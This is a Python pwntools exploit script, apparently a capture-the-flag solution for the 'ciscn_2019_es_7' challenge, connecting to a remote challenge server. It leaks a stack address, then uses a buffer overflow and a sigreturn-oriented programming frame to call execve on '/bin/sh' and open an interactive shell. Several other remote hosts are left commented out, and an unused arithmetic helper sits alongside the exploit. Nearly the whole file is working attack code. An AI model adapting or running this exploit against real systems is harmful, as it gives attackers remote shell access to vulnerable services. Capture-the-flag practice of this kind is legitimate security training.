# import time
from pwn import *


# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 9999)
# io = remote("192.168.170.128", 1234)
io = remote("node5.buuoj.cn", 28900)
# io = remote("43.249.195.138",  26189)
# io = remote("8.130.35.16", 52003)
# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("112.6.51.212", 30791)

# io = process('./q2')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./ciscn_2019_es_2')
# libc = ELF('./2.31-0ubuntu9_amd64/libc-2.31.so')


# libc = ELF('./libc-2.23.so')

def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result

elf = ELF('./ciscn_2019_es_7')
# write_plt = elf.plt['write']
# write_got = elf.got['write']
# printf_got = elf.got['printf']
# printf_plt = elf.plt['printf']
# atoi_got = elf.got['atoi']
# main_addr = elf.symbols['main']
#
# libc = ELF('./libc.so.6')

context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

__NR_read = 0
__NR_write = 1
__NR_open = 2
__NR_rt_sigreturn = 15
__NR_execve = 59

pop_rax_15_ret_addr = 0x4004DA
syscall = 0x0400517
pop_rdi = 0x00000000004005a3
read_write = 0x4004f1

payload = b'/bin/sh\x00' + b'a'*0x8 + p64(read_write)
sl(payload)
io.recv(0x20)
bp = u64(io.recv(8))
print(hex(bp))
binsh = bp - 0x118

offset = b'a' * (0x10)
do_sigreturn = offset + p64(pop_rax_15_ret_addr) + p64(syscall)

systemFrame = SigreturnFrame()
systemFrame.rax = __NR_execve
systemFrame.rdi = binsh
systemFrame.rsi = 0
systemFrame.rdx = 0
systemFrame.rip = syscall

payload = do_sigreturn + bytes(systemFrame)
sleep(5)
sl(payload)

inter()